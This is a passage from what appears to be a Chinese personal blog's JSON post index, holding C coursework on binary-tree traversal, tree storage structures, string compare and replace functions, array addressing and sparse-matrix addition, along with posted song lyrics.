push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); t = t-&gt;rchild; &#125; &#125;&#125;//中序遍历（左 根 右）void inorder_1(bintree t)&#123; seqstack s; s.top = 0; while((t!=NULL) || (s.top!=0))&#123; if(t)&#123; push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); printf(&quot;%c&quot;,t-&gt;data); t = t-&gt;rchild; &#125; &#125;&#125;//后序遍历（左 右 根）void postorder_1(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; if(t)&#123; s.data[s.top] = t; s.tag[s.top] = 0; s.top++; t = t-&gt;lchild; &#125;else if(s.tag[s.top-1] == 1)&#123; s.top--; t = s.data[s.top]; printf(&quot;%c&quot;,t-&gt;data); t = NULL; &#125;else&#123; t = s.data[s.top-1]; s.tag[s.top-1] = 1; t = t-&gt;rchild; &#125; &#125;&#125; 源文件 test.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &quot;bintree.h&quot;void Menu()&#123; printf(&quot;---------------------菜单界面--------------------\\n&quot;); printf(&quot; \\n&quot;); printf(&quot; \\t1.递归遍历 2.非递归遍历 \\n&quot;); printf(&quot; \\n&quot;); printf(&quot;---------------------0.退出----------------------\\n&quot;);&#125;//测试int main()&#123; int select; bintree t; printf(&quot;请根据前序遍历结果输入二叉树的 结点值（空子树使用 # 代替）：\\n&quot;); t = createbintree(); while(1)&#123; Menu(); printf(&quot;请输入菜单选项：&quot;); scanf(&quot;%d&quot;,&amp;select); switch(select)&#123; case 1: //递归遍历 printf(&quot;前序遍历结果：&quot;); preorder(t); printf(&quot;\\n&quot;); printf(&quot;中序遍历结果：&quot;); inorder(t); printf(&quot;\\n&quot;); printf(&quot;后序遍历结果：&quot;); postorder(t); printf(&quot;\\n&quot;); break; case 2: //递归遍历 printf(&quot;前序遍历结果：&quot;); preorder(t); printf(&quot;\\n&quot;); printf(&quot;中序遍历结果：&quot;); inorder(t); printf(&quot;\\n&quot;); printf(&quot;后序遍历结果：&quot;); postorder(t); printf(&quot;\\n&quot;); break; case 0: return 0; default: printf(&quot;您输入的选项有误，请重新输入：\\n&quot;); &#125; system(&quot;pause&quot;); system(&quot;cls&quot;); &#125;&#125; 测试以上图 二叉树 为例： 1234前序遍历结果：abdefgc 输入：abd##ef##g##c##中序遍历结果：dbfegac后序遍历结果：dfgebca","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"Struggling","slug":"Struggling","date":"2021-11-07T04:52:59.000Z","updated":"2021-11-07T04:57:27.852Z","comments":true,"path":"2021/11/07/Struggling/","link":"","permalink":"https://xizhi-future.github.io/2021/11/07/Struggling/","excerpt":"","text":"","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"二叉树_题","slug":"二叉树-题","date":"2021-11-06T03:34:01.000Z","updated":"2021-11-14T09:29:03.147Z","comments":true,"path":"2021/11/06/二叉树-题/","link":"","permalink":"https://xizhi-future.github.io/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/","excerpt":"","text":"分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数bintree.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define N 1000extern char *a; /* 如果在定义点之前的函数想引用该全局变量，则应该在引用之前用关键字 extern 对该变量作“外部变量声明”，表示该变量是一个已经定义的外部变量 *///链式存储，不带双亲typedef struct node&#123; char data; struct node *lchild,*rchild;&#125;binnode;typedef binnode *bintree;//二叉树的 创建void create(bintree *t)&#123; char ch = *a++; if(ch == &#x27; &#x27;) *t = NULL; else&#123; *t = (bintree)malloc(sizeof(binnode)); (*t)-&gt;data = ch; create(&amp;(*t)-&gt;lchild); create(&amp;(*t)-&gt;rchild); &#125;&#125;//前序 递归 遍历 二叉树void preorder(bintree t)&#123; if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); preorder(t-&gt;lchild); preorder(t-&gt;rchild); &#125;&#125;//顺序栈 定义typedef struct&#123; bintree data[N]; int top;&#125;seqstack;//初始化 顺序栈void init(seqstack *s)&#123; s-&gt;top = -1;&#125;//判断栈是否为空int empty(seqstack *s)&#123; if(s-&gt;top &gt; -1) return 0; //不为空 else return 1; //为空&#125;//判断栈是否 满int full(seqstack *s)&#123; if(s-&gt;top == N-1) return 1; //满 else return 0; //不满&#125;//进栈void push(seqstack *s,bintree x)&#123; if(!full(s)) s-&gt;data[++s-&gt;top] = x;&#125;//出栈bintree pop(seqstack *s)&#123; if(!empty(s)) return s-&gt;data[s-&gt;top--];&#125; 333.cpp 12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;bintree.h&quot;char *a = &quot;ABD EF G C &quot;; //前序序列//递归方法求 二叉树 叶子结点的个数int lefts_1(bintree t)&#123; if(t == NULL) return 0; else if(!t-&gt;lchild &amp;&amp; !t-&gt;rchild) return 1; else return lefts_1(t-&gt;lchild) + lefts_1(t-&gt;rchild);&#125;//非递归方法 求 二叉树 叶子结点的 个数 (需要使用到顺序栈)int lefts_2(bintree t)&#123; seqstack s; int count = 0; init(&amp;s); while(t || !empty(&amp;s))&#123; if(t)&#123; if(!t-&gt;lchild &amp;&amp; !t-&gt;rchild) count++; push(&amp;s,t); t = t-&gt;lchild; &#125; else&#123; t = pop(&amp;s); t = t-&gt;rchild; &#125; &#125; return count;&#125;//测试int main()&#123; bintree t; create(&amp;t); printf(&quot;递归算法：二叉树叶子结点个数---%d\\n&quot;,lefts_1(t)); printf(&quot;非递归算法：二叉树叶子结点个数---%d\\n&quot;,lefts_2(t));&#125; 以上面的二叉树为例： 1char *a = &quot;ABD EF G C &quot;; //前序序列","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"树型结构","slug":"树型结构","date":"2021-10-30T09:48:21.000Z","updated":"2021-10-30T09:51:16.228Z","comments":true,"path":"2021/10/30/树型结构/","link":"","permalink":"https://xizhi-future.github.io/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/","excerpt":"","text":"树型结构1.1 概念树：n &gt;= 0 个结点的有限集合，一棵树是由根和它的子树构成，子树又由子树的根和更小的子树构成。 空树：n = 0 森林：一棵树中每个结点的子树多构成的集合，即在森林中的每棵树加上一个共同的根，森林就成为了一颗树。 上端结点、下端结点 双亲（父母、前件） 子女（孩子、后件） 兄弟 祖先 子孙 某结点的度：该结点所拥有的子女数 树的度：树中所有结点度的最大值 树枝：树中连接两个结点的线段 树的深度（高度）：树的层次数 终端结点（叶子结点）：度为 0 的结点 非终端结点（分支结点）：度不为 0 的结点 路径：从某结点开始沿着自上而下的顺序到达另一个结点，称该路径 路径的长度：是所经过的树枝的条数 树形结构的表示方法：括号表示法、嵌套集合表示法、凹入表示法 有序树 无序树 例：下面的树，若看成是有序树则不相等；若肯成是无序树，则可看作是相等的。 1.2 树的存储结构1.2.1 双亲表示法 —– 一维数组data parent 根结点 双亲 值 定义为 -1，root 位置定为 0 1234567891011#define MAXSIZE 100typedef char datatype; //根据树中结点的具体类型进行定义，这里我们假设是字符型typedef struct node&#123; datatype data; //结点的类型 int parent; //结点双亲的下表&#125;node;typedef struct tree&#123; node treelist[MAXSIZE]; //存放结点的数组 int length,root; //树中实际所含结点的个数 根结点的位置&#125;tree; 1.2.2 孩子表示法 —– 三种指针方式 孩子表示法 —- 指针数组 每个结点：两个域 值域：data 指针数组（每个元素是一个指向该结点子女的指针）：child[m] 度为m的树，其指针数组的大小即是 m 12345678#define m 3 //树的度数typedef char datatype;typedef struct node&#123; datatype data; struct node *child[m]; //指向子女的指针数组&#125;node,*tree;tree root; //指向树根结点的指针 数组方式 孩子表示法 —- 一维数组 每个结点：域个数不定 值域：data 一维数组：child[m] 1234567891011#define m 3#define MAXSIZE 20typedef char datatype;typedef struct node&#123; datatype data; int child[m];&#125;treenode;treenode tree[MAXSIZE]; //存储树结点的数组int root; //根结点 下标int length; //树中实际所含结点个数 指针方式和数组方式孩子表示法缺点： 每个结点所含子女个数不知道，不相同，则 child 数组的大小仅仅由 树的度决定，则会造成 空间的闲置与浪费。 解决：链表方式孩子表示法 链表方式 孩子表示法 每个结点：两个域 值域：data 指针域（指向该结点的第一个子女） 每个结点子女 又 排列起来形成一个单链表，n 个结点 n 个单链表 再使用数组存储单链表的头指针 12345678910111213141516#define MAXSIZE 50typedef char datatype;typedef struct chnode&#123; //孩子结点类型：单链表 int child; struct chnode *next;&#125;chnode,*chpoint;typedef struct&#123; //树中每个结点类型 datatype data; chpoint firstchild; //指向第一个子女结点的指针&#125;node;typedef struct&#123; //树的类型 node treelist[MAXSIZE]; int length,root; //树中实际所含结点个数、根结点的位置&#125;tree; 链表方式孩子表示法 虽然可以建立动态的链表，但是又要额外需要空间来存放一个指向下一个子女的指针 next，又增加了空间的开销。 应根据实际情况进行存储方式的选择。 1.2.3 孩子兄弟表示法 （二叉树表示法）每个结点：三个域 值域：data 两个指针域：firstchild rightchild (分别指向该结点的第一个子女和其右兄弟) 1234567typedef char datatype;typedef struct node&#123; //树的结点类型 datatype data; struct node *firstchild,*rightsibling; //第一个子女、右兄弟&#125;node,*pnode;pnode root; //指向树根结点的指针 1.3 树的遍历按照某种规定的顺序访问树中每一个结点，且每个结点仅仅只能访问一次 1.3.1 前序遍历 —- 根-&gt;左-&gt;右1.3.2 后序遍历 —- 左-&gt;右-&gt;根1.3.3 层次遍历 —- 上至下，左至右","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"那一年","slug":"那一年","date":"2021-10-26T13:00:00.000Z","updated":"2021-10-26T13:07:43.969Z","comments":true,"path":"2021/10/26/那一年/","link":"","permalink":"https://xizhi-future.github.io/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/","excerpt":"","text":"​ 那一年放肆的自由 就这样牵起你的手 不懂什么温柔不顾你的感受 寂寞总把我冲昏头 是你体谅我的任性要求 在别人都放弃了我以后 沉默的心为你再次悸动 浩瀚宇宙美不胜收 只是我不配再把你拥有 当你独自面对回忆汹涌 那一年雪都下的很沉重 不敢回头明知你泪在流 泛黄的日记写永久 讽刺我现在才会懂 怀念你的温柔还有什么感受 寂寞让我习惯了痛 是你体谅我的任性要求 在别人都放弃了我以后 沉默的心为你再次悸动 浩瀚宇宙美不胜收 只是我不配再把你拥有 当你独自面对回忆汹涌 那一年雪都下的很沉重 不敢回头明知你泪在流 我们爱到尽头谁都不肯放手 不如坏人就由我担当承受 不管你懂不懂我成全的疼痛 是你体谅我的任性要求 在别人都放弃了我以后 沉默的心为你再次悸动 浩瀚宇宙美不胜收 只是我不配把你拥有 当你独自面对回忆汹涌 那一年雪都下的很沉重 不敢回头明知你泪在流","categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"第四章、第五章习题（字符串、数组、矩阵）","slug":"第四章、第五章习题（字符串、数组、矩阵）","date":"2021-10-26T12:51:29.000Z","updated":"2021-10-26T12:52:59.347Z","comments":true,"path":"2021/10/26/第四章、第五章习题（字符串、数组、矩阵）/","link":"","permalink":"https://xizhi-future.github.io/2021/10/26/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%81%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%B9%A0%E9%A2%98%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E7%9F%A9%E9%98%B5%EF%BC%89/","excerpt":"","text":"[TOC] 1. 试编写一个函数，实现在 链式存储方式 下字符串的 strcompare(S1,S2)算法： 12345678910111213141516//进行比较int strcompare(linkstrnode *S1,linkstrnode *S2)&#123; while(S1 &amp;&amp; S2) &#123; if(S1-&gt;data &gt; S2-&gt;data) return 1; else if(S1-&gt;data &lt; S2-&gt;data) return -1; S1 = S1-&gt;next; S2 = S2-&gt;next; &#125; if(S1) return 1; else if(S2) return -1;&#125; 测试： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; char data; struct node *next;&#125;linkstrnode;typedef linkstrnode *linkstring;// 创建单链表 尾插法void strcreate(linkstring *S)&#123; char ch; linkstrnode *p,*r; *S = NULL; r = NULL; //r始终指向当前链式串最后一个字符对应的结点 while((ch = getchar()) != &#x27;\\n&#x27;) &#123; p = (linkstrnode *)malloc(sizeof(linkstrnode)); p-&gt;data = ch; if(*S == NULL) //本为空表 *S = p; else r-&gt;next = p; //不为空表 r = p; &#125; if(r != NULL) r-&gt;next = NULL; //处理尾结点指针域&#125;//打印输出void print(linkstring head)&#123; linkstrnode *p; p = head; while(p) &#123; printf(&quot;%c-&gt;&quot;,p-&gt;data); p = p-&gt;next; &#125; printf(&quot;\\n&quot;);&#125;//进行比较int strcompare(linkstrnode *S1,linkstrnode *S2)&#123; while(S1 &amp;&amp; S2) &#123; if(S1-&gt;data &gt; S2-&gt;data) return 1; else if(S1-&gt;data &lt; S2-&gt;data) return -1; S1 = S1-&gt;next; S2 = S2-&gt;next; &#125; if(S1) return 1; else if(S2) return -1;&#125;//主函数int main()&#123; linkstring s1,s2; int k; printf(&quot;\\n请输入第一个字符串 s1：&quot;); strcreate(&amp;s1); print(s1); printf(&quot;\\n请输入第二个字符串 s2：&quot;); strcreate(&amp;s2); print(s2); k = strcompare(s1,s2); printf(&quot;\\n比较的结果为：\\n&quot;); if(k == 1) printf(&quot;s1 &gt; s2&quot;); else if(k == -1) printf(&quot;s1 &lt; s2&quot;); else printf(&quot;s1 == s2&quot;); printf(&quot;\\n&quot;); return 0;&#125; 2. 试编写一个函数，实现在 顺序存储方式 下字符串的 replace(S,T1,T2) 运算算法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//replace 运算void replace(seqstring *s,seqstring t1,seqstring t2,int next[])&#123; int i,j,k,c,m; i = 0; j = 0; k = 0; while(i &lt; s-&gt;length) &#123; j = 0; while(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length) &#123; if(j == -1 || s-&gt;str[i] == t1.str[j]) &#123; i++; j++; &#125;else j = next[j]; &#125; if(j == t1.length) &#123; c = i-t1.length; if(t1.length == t2.length) for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; else if(t1.length &lt; t2.length) &#123; for(m = s-&gt;length-1;m &gt; i-1;m--) s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m]; for(k=0;k &lt; t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length-t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; else &#123; for(m = i-1;m &lt; s-&gt;length;m++) s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m]; for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length - t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; i = i+t2.length - t1.length; &#125; i++; &#125;&#125; 测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define MAXSIZE 100typedef struct&#123; char str[MAXSIZE]; int length;&#125;seqstring;//求模式 next 函数void getnext(seqstring p,int next[])&#123; int i,j; next[0] = -1; i = 0; j = -1; while(i &lt; p.length) &#123; if(j == -1 || p.str[i] == p.str[j])&#123; ++i; ++j; next[i] = j; &#125;else j = next[j]; &#125;&#125;//replace 运算void replace(seqstring *s,seqstring t1,seqstring t2,int next[])&#123; int i,j,k,c,m; i = 0; j = 0; k = 0; while(i &lt; s-&gt;length) &#123; j = 0; while(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length) &#123; if(j == -1 || s-&gt;str[i] == t1.str[j]) &#123; i++; j++; &#125;else j = next[j]; &#125; if(j == t1.length) &#123; c = i-t1.length; if(t1.length == t2.length) for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; else if(t1.length &lt; t2.length) &#123; for(m = s-&gt;length-1;m &gt; i-1;m--) s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m]; for(k=0;k &lt; t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length-t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; else &#123; for(m = i-1;m &lt; s-&gt;length;m++) s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m]; for(k=0;k&lt;t2.length;k++) s-&gt;str[c+k] = t2.str[k]; s-&gt;length = s-&gt;length - t1.length + t2.length; s-&gt;str[s-&gt;length] = &#x27;\\0&#x27;; &#125; i = i+t2.length - t1.length; &#125; i++; &#125;&#125;//主函数int main()&#123; int next[MAXSIZE]; seqstring s,t1,t2; printf(&quot;请输入 s：&quot;); gets(s.str); printf(&quot;请输入 t1：&quot;); gets(t1.str); printf(&quot;请输入 t2：&quot;); gets(t2.str); s.length = strlen(s.str); t1.length = strlen(t1.str); t2.length = strlen(t2.str); getnext(t1,next); replace(&amp;s,t1,t2,next); printf(&quot;替换后的结果是：&quot;); puts(s.str); printf(&quot;\\n&quot;);&#125; 3. 编写一个函数，实现在链式存储方式下字符串的 replace(S,T1,T2)算法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//replace 函数linkstring replace(linkstring S,linkstring T1,linkstring T2)&#123; linkstring p,q,r,s,pre,temp,pos; int flag = 1; if (S == NULL|| T1 == NULL ) //若 S 为空或 T1 为空,则原串不变 return S; pre = NULL; pos = S; /*pos 表示可能的 T1 串在 S 中的起始位置*/ while (pos &amp;&amp; flag) &#123; p = pos; q = T1; while(p &amp;&amp; q) &#123; if(p-&gt;data == q-&gt;data)&#123; p = p-&gt;next; q = q-&gt;next; &#125;else&#123; pre = pos; pos = pos-&gt;next; p = pos; q = T1; &#125; &#125; if(q != NULL) flag = 0; else &#123; flag = 1; r = pos; while(r != p) &#123; s = r; r = r-&gt;next; free(s); &#125; if(T2 != NULL) &#123; temp = r = copy(T2); while(r-&gt;next != NULL) r = r-&gt;next; r-&gt;next = p; if(pre == NULL) S = temp; else pre-&gt;next = temp; pre = r; pos = p; &#125; else &#123; if(pre == NULL) S = p; else pre-&gt;next = p; pos = p; &#125; &#125; &#125; return S;&#125; 测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; char data; struct node *next;&#125;linkstrnode;typedef linkstrnode *linkstring;// 创建单链表 尾插法void strcreate(linkstring *S)&#123; char ch; linkstrnode *p,*r; *S = NULL; r = NULL; //r始终指向当前链式串最后一个字符对应的结点 while((ch = getchar()) != &#x27;\\n&#x27;) &#123; p = (linkstrnode *)malloc(sizeof(linkstrnode)); p-&gt;data = ch; if(*S == NULL) //本为空表 *S = p; else r-&gt;next = p; //不为空表 r = p; &#125; if(r != NULL) r-&gt;next = NULL; //处理尾结点指针域&#125;//打印输出void print(linkstring head)&#123; linkstrnode *p; p = head; while(p) &#123; printf(&quot;%c-&gt;&quot;,p-&gt;data); p = p-&gt;next; &#125; printf(&quot;\\n&quot;);&#125;//单链表拷贝函数linkstring copy(linkstring head)&#123; linkstring L = NULL,r = NULL,s,p; p = head; while(p) &#123; s = (linkstring)malloc(sizeof(linkstrnode)); s-&gt;data = p-&gt;data; if(L == NULL) L = r = s; else&#123; r-&gt;next = s; r = s; &#125; p = p-&gt;next; &#125; if(r!= NULL) r-&gt;next = NULL; return L;&#125;//replace 函数linkstring replace(linkstring S,linkstring T1,linkstring T2)&#123; linkstring p,q,r,s,pre,temp,pos; int flag = 1; if (S == NULL|| T1 == NULL ) //若 S 为空或 T1 为空,则原串不变 return S; pre = NULL; pos = S; /*pos 表示可能的 T1 串在 S 中的起始位置*/ while (pos &amp;&amp; flag) &#123; p = pos; q = T1; while(p &amp;&amp; q) &#123; if(p-&gt;data == q-&gt;data)&#123; p = p-&gt;next; q = q-&gt;next; &#125;else&#123; pre = pos; pos = pos-&gt;next; p = pos; q = T1; &#125; &#125; if(q != NULL) flag = 0; else &#123; flag = 1; r = pos; while(r != p) &#123; s = r; r = r-&gt;next; free(s); &#125; if(T2 != NULL) &#123; temp = r = copy(T2); while(r-&gt;next != NULL) r = r-&gt;next; r-&gt;next = p; if(pre == NULL) S = temp; else pre-&gt;next = temp; pre = r; pos = p; &#125; else &#123; if(pre == NULL) S = p; else pre-&gt;next = p; pos = p; &#125; &#125; &#125; return S;&#125;//主函数int main()&#123; linkstring S,T1,T2; printf(&quot;请输入 S：&quot;); strcreate(&amp;S); print(S); printf(&quot;\\n请输入 T1：&quot;); strcreate(&amp;T1); print(T1); printf(&quot;\\n请输入 T2：&quot;); strcreate(&amp;T2); print(T2); S=replace(S,T1,T2); printf(&quot;\\n替换后的结果为：\\n&quot;); print(S); &#125; 4. 编写一个函数，实现在 顺序存储方式 下字符串的 strcompare(S1,S2)算法： 1234567891011121314151617//strcompare 函数int strcompare(seqstring s1,seqstring s2)&#123; int i,m = 0,len; len = s1.length&lt;s2.length?s1.length:s2.length; for(i=0;i&lt;=len;i++) if(s1.str[i] &gt; s2.str[i]) &#123; m = 1; break; &#125; else if(s1.str[i] &lt; s2.str[i]) &#123; m = -1; break; &#125; return m;&#125; 测试： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define MAXSIZE 100typedef struct&#123; char str[MAXSIZE]; int length;&#125;seqstring;//strcompare 函数int strcompare(seqstring s1,seqstring s2)&#123; int i,m = 0,len; len = s1.length&lt;s2.length?s1.length:s2.length; for(i=0;i&lt;=len;i++) if(s1.str[i] &gt; s2.str[i]) &#123; m = 1; break; &#125; else if(s1.str[i] &lt; s2.str[i]) &#123; m = -1; break; &#125; return m;&#125;//主函数int main()&#123; seqstring s1,s2; int i,m; printf(&quot;请输入 s1：\\n&quot;); gets(s1.str); s1.length=strlen(s1.str); printf(&quot;请输入 s2：\\n&quot;); gets(s2.str); s2.length = strlen(s2.str); m = strcompare(s1,s2); if(m == 1) printf(&quot;s1 &gt; s2\\n&quot;); else if(m == -1) printf(&quot;s2 &gt; s1\\n&quot;); else if(m == 0) printf(&quot;s1 == s2\\n&quot;); &#125; 5. 已知三维数组 A[3][2][4]，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素 A[0][1][2]在 按行优先 和 按列优先 存储方式下的地址12A[0][1][2]按行优先方式在内存的存储地址为：100+0*8+1*4+2=106A[0][1][2]按列优先方式在内存的储储地址为：100+2*6+1*3+0*8=115 6. 已知两个 稀疏矩阵 A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用 三元组 表示。算法： 123456789101112131415161718192021222324252627282930313233343536373839404142//三元组：矩阵相加void add(spmatrix a,spmatrix b,spmatrix c)&#123; int i,j,k,t,r; i = j = k = 1; while(i&lt;=a[0][2]&amp;&amp;j&lt;=b[0][2])&#123; if(a[i][0] &lt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1]&lt;b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125;else if(a[i][0] &gt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1] &gt; b[j][1]))&#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; else if(a[i][0] == b[j][0] &amp;&amp; (a[i][1] == b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]+b[j][2]; i++;j++; if(c[k][2] != 0) k++; &#125; &#125; while(j &lt;= b[0][2]) &#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; while(i &lt;= a[0][2]) &#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125; c[0][0]=a[0][0]; c[0][1]=a[0][1]; c[0][2]=k-1; &#125; 测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include&lt;stdio.h&gt;typedef struct&#123; int data[100][100]; int m,n; //稀疏矩阵 行数、列数、非零元素的个数&#125;matrix;typedef int spmatrix[100][3];spmatrix c;//三元组：矩阵相加void add(spmatrix a,spmatrix b,spmatrix c)&#123; int i,j,k,t,r; i = j = k = 1; while(i&lt;=a[0][2]&amp;&amp;j&lt;=b[0][2])&#123; if(a[i][0] &lt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1]&lt;b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125;else if(a[i][0] &gt; b[j][0] || (a[i][0] == b[j][0] &amp;&amp; a[i][1] &gt; b[j][1]))&#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; else if(a[i][0] == b[j][0] &amp;&amp; (a[i][1] == b[j][1]))&#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]+b[j][2]; i++;j++; if(c[k][2] != 0) k++; &#125; &#125; while(j &lt;= b[0][2]) &#123; c[k][0]=b[j][0]; c[k][1]=b[j][1]; c[k][2]=b[j][2]; j++;k++; &#125; while(i &lt;= a[0][2]) &#123; c[k][0]=a[i][0]; c[k][1]=a[i][1]; c[k][2]=a[i][2]; i++;k++; &#125; c[0][0]=a[0][0]; c[0][1]=a[0][1]; c[0][2]=k-1; &#125;//将普通矩阵存储转换成 三元组 的 存储结构void change_matrix(matrix *A,spmatrix B)&#123; int i,j,k; k = 1; for(i = 0;i &lt; A-&gt;m; i++) for(j = 0;j &lt; A-&gt;n; j++) if(A-&gt;data[i][j] != 0) &#123; B[k][0] = i; B[k][1] = j; B[k][2] = A-&gt;data[i][j]; k++; &#125; B[0][0] = A-&gt;m; B[0][1] = A-&gt;n; B[0][2] = k-1; i = 0; printf(&quot;三元组矩阵 展示：\\n&quot;); while(i &lt;= B[0][2]) &#123; printf(&quot;%d%5d%5d\\n&quot;,B[i][0],B[i][1],B[i][2]); i++; &#125;&#125;//创建矩阵void create(int r,int w,matrix *s)&#123; int i,j,data; printf(&quot;请输入数据：\\n&quot;); for(i=0;i&lt;r;i++) for(j=0;j&lt;w;j++) &#123; scanf(&quot;%d&quot;,&amp;data); s-&gt;data[i][j] = data; &#125; printf(&quot;矩阵展示：\\n&quot;); for(i=0;i&lt;r;i++) &#123; for(j=0;j&lt;w;j++) printf(&quot;%5d&quot;,s-&gt;data[i][j]); printf(&quot;\\n&quot;); &#125; s-&gt;m = r; s-&gt;n = w;&#125;//主函数int main() &#123; matrix p,q; spmatrix a,b,c; int r,w,i; i = 0; printf(&quot;请输入矩阵的 行 与 列：&quot;); scanf(&quot;%d%d&quot;,&amp;r,&amp;w); create(r,w,&amp;p); create(r,w,&amp;q); change_matrix(&amp;p,a); change_matrix(&amp;q,b); i = 0; add(a,b,c); printf(&quot;进行加法运算后的 三元组矩阵 展示：\\n&quot;); while(i &lt;= c[0][2])&#123; printf(&quot;%d%5d%5d\\n&quot;,c[i][0],c[i][1],c[i][2]); i++; &#125;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"像真的一样","slug":"像真的一样","date":"2021-10-15T09:01:08.000Z","updated":"2021-10-15T09:05:02.271Z","comments":true,"path":"2021/10/15/像真的一样/","link":"","permalink":"https://xizhi-future.github.io/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/","excerpt":"","text":"你习惯 可能会幸福的预感 你期盼 等暧昧过完 能改写身份这一栏 你鼻酸 就算都与你无关 他心烦 你跟着想要呐喊 恋人们的手说放就放 知己就没分手的情况 能在彼此身旁 你最擅长模仿 像真的一样 是伪装或武装 用友情来匿藏 你多想 躺一躺 他肩膀 你最擅长模仿 像真的坚强 孤独无尽漫长 背负着一个谎 他清场 他怯场 他离场 你都是暖场 边拐弯 打听关于爱的答案 边感叹 感情的艰难 却对感情避而不谈 另一半 若像是太阳一般 天一寒 怎么向你来取暖 恋人们的手说放就放 遗憾转身就遗忘 你还在他身旁 你最擅长模仿 像真的一样 是伪装或武装 用友情来匿藏 你多想 躺一躺 他肩膀 你最擅长模仿 像真的坚强 孤独无尽漫长 背负着一个谎 他清场 他怯场 他离场 你都是暖场 消音的话 只会更强化 不能没有他 你最擅长模仿 像真的一样 是伪装或武装 用友情来匿藏 你多想 躺一躺 他肩膀 你最擅长模仿 像真的坚强 